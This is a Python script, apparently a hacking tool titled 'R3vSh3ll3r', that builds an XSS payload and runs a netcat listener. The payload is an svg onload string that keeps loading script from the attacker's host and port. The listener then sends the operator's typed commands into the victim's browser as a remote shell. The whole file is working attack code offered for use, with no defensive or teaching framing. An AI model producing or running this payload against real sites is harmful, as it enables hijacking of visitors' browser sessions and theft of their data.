#GitHub: @t3rabyt3
#Instagram: @1024gigabyte


#!/usr/bin/env python3
import socket
import os
import time
import sys
from subprocess import Popen,PIPE,STDOUT,call 

if sys.version_info < (3, 0):
    input = raw_input

white = '\033[1;97m'
green = '\033[1;32m'
red = '\033[1;31m'
yellow = '\033[1;33m'
end = '\033[1;m'
info = '\033[1;33m[!]\033[1;m'
que =  '\033[1;34m[?]\033[1;m'
bad = '\033[1;31m[-]\033[1;m'
good = '\033[1;32m[+]\033[1;m'
run = '\033[1;97m[~]\033[1;m'

print ('''%s
 ____  _____       ____  _     _____ _ _ _____      
|  _ \|___ /_   __/ ___|| |__ |___ /| | |___ / _ __ 
| |_) | |_ \ \ / /\___ \| '_ \  |_ \| | | |_ \| '__|
|  _ < ___) \ V /  ___) | | | |___) | | |___) | |   
|_| \_\____/ \_/  |____/|_| |_|____/|_|_|____/|_| 

    }========{+}Made By T3rabyt3{+}========{
}========{+}Instagram: @1024gigabyte{+}========{
    }========{+}GitHub: @t3rabyt3{+}========{

''' % red)
o = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
o.connect(("8.8.8.8", 80))
LH = o.getsockname()[0]
o.close()

userinput = input('%s %s%s%s : WANT TO USE THIS LHOST? [Y or N] ' % (que, red, LH, end)).lower()
if userinput == 'n':
    LH = input('%s ENTER YOUR CUSTOM LHOST:- ' % que)
LP = '1337'
userinput = input('%s %s%s%s : WANT TO USE THIS LPORT? [Y or N] ' % (que, red, LP, end)).lower()
if userinput == 'n':
    LP = input('%s ENTER YOUR CUSTOM LPORT:- ' % que)
print (' ')
print (' =======================================')
print ('           PAYLOAD GENERATED' )
print (' =======================================')
print ('           | | | | | | | | | ')
print ('           v v v v v v v v v')
print (' ')
brutelogicpayload = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},100);>\n' % (LH, LP)
print (brutelogicpayload)
print ('%s PAYLOAD EXECUTION PENDING....' % run)

def shell():
    os.system('printf "\033[F\033[0;31m$\033[0m "; read c; echo "$c" | timeout 1 nc -lp %s >/dev/null;' % LP)
    shell()

def status():
    proc=Popen('timeout 1 nc -lp %s' % LP, shell=True, stdout=PIPE, )
    response = str(proc.communicate()[0])
    if 'Accept' in response:
        print (response.replace('\\r\\n', '\n').replace('b\'', '')[:-3])
        print ('\n%s Payload Executed. Enter Commands Now:- \n\n' % good)
        shell()
    else:
        os.system('printf "\033[F"')
        time.sleep(2)
        status()

status()
